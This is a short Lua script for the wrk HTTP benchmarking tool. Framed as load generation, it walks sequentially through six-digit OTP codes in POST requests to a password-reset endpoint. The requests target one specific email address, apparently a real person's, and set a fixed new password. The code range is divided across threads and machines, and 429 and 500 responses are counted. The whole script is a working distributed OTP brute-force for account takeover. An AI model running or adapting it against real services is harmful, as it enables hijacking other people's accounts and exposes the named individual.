local MACHINE_BASE = tonumber(os.getenv("MACHINE_BASE")) or 0
local THREADS_COUNT = 2
local MACHINE_QUOTA = 250000
local thread_quota = MACHINE_QUOTA / THREADS_COUNT

local thread_indexer = 0

function setup(thread)
    thread_indexer = thread_indexer + 1
    thread:set("id", thread_indexer)
end

-- Thread-isolated tracking variables
local my_requests_sent = 0
local my_base_id = 0
local status_codes = {} -- Table to count specific HTTP responses (200, 429, 500, etc)

function init(args)
    local my_thread_id = wrk.thread:get("id")
    my_base_id = MACHINE_BASE + (my_thread_id - 1) * thread_quota
end

-- This hook intercepts EVERY response your server sends back
response = function(status, headers, body)
    status_codes[status] = (status_codes[status] or 0) + 1
end

request = function()
    my_requests_sent = my_requests_sent + 1

    if my_requests_sent > thread_quota then
        -- BEFORE the thread kills itself, print the exact error breakdown to the console
        print(string.format("\n--- Thread %d HTTP Status Summary ---", wrk.thread:get("id")))
        for code, count in pairs(status_codes) do
            print(string.format("  HTTP Status %s: %d responses", tostring(code), count))
        end
        print("------------------------------------\n")

        wrk.thread:stop()
        return nil
    end

    local unique_user_id = my_base_id + my_requests_sent

    local headers = {}
    headers["Content-Type"] = "application/json"

    local body = string.format('{"email": "harshpoonia231199@acropolis.in","otp": "%06d","newPassword": "Sorry@1357"}', unique_user_id)
    return wrk.format("POST", "/api/auth/reset-password", headers, body)
end
